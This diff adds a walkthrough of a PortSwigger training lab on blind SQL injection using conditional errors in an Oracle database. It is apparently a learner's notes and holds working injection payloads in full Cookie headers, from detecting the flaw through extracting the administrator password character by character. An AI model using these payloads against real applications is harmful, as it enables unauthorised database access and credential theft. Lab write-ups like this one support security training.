@@ -1,0 +1,48 @@
+https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+
+Actions:
+1. Identify sqli parameter. 
+The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. 
+If the SQL query causes an error, then the application returns a custom error message.
+2. Invoke an error response to trigger custom message.
+3. Determine database type. Confirm use of Oracle as per hint. 
+4. Verify "users" table exists.
+5. Trigger error with a conditional boolean.
+6. A table called "users" with columns "username" and "password" exists. Enumerate length of password.
+7. Exploit the BLIND sqli to return the password for the administrator account. Retrieve the password using python rather than intruder.
+
+Results:
+1. TrackingID parameter.
+
+2. Injecting a single quote after the TrackingID returns a "Internal Server Error" message. Adding two single quotes '' returns OK.
+Cookie: TrackingId=LZrpChjNyfqGMz2a'; session=ckfXlpNPOiMKSl4KKFZls8oPgkVFaGuc
+
+3. Confirming ORACLE database. Changing the table name results in the custom error. 
+'|| (SELECT 1 FROM dual) ||'
+Cookie: TrackingId=LZrpChjNyfqGMz2a'||+(SELECT+1+FROM+dual)+||';
+
+4. Verify "users" table exists. Using ROWNUM to return a single row to prevent an error on the concatentation.
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+Cookie: TrackingId=LZrpChjNyfqGMz2a'||(SELECT+''+FROM+users+WHERE+ROWNUM+%3d+1)||';
+
+5. TRUE (1=1) versus FALSE (1=2)
+
+TRUE - ERROR (divide by 0)
+Cookie: TrackingId=LZrpChjNyfqGMz2a'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||';
+FALSE - OK page loads
+Cookie: TrackingId=LZrpChjNyfqGMz2a'||(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||';
+
+We are using the error response to confirm something in TRUE. For example confirming the administrator account exists:
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+Cookie: TrackingId=LZrpChjNyfqGMz2a'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||';
+
+6. Confirming password length of 20.
+'||(SELECT CASE WHEN LENGTH(password)>19 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+Cookie: TrackingId=LZrpChjNyfqGMz2a'||(SELECT+CASE+WHEN+LENGTH(password)>19+THEN+to_char(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||';
+
+7. Retrieve administrator password
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+Cookie: TrackingId=LZrpChjNyfqGMz2a'||(SELECT+CASE+WHEN+SUBSTR(password,1,1)%3d'n'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||';
+
+See password-retrieval.py
